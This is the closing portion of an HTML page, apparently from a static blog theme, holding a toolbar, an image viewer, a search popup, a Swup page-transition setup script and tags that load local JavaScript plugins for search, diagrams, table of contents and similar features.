		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>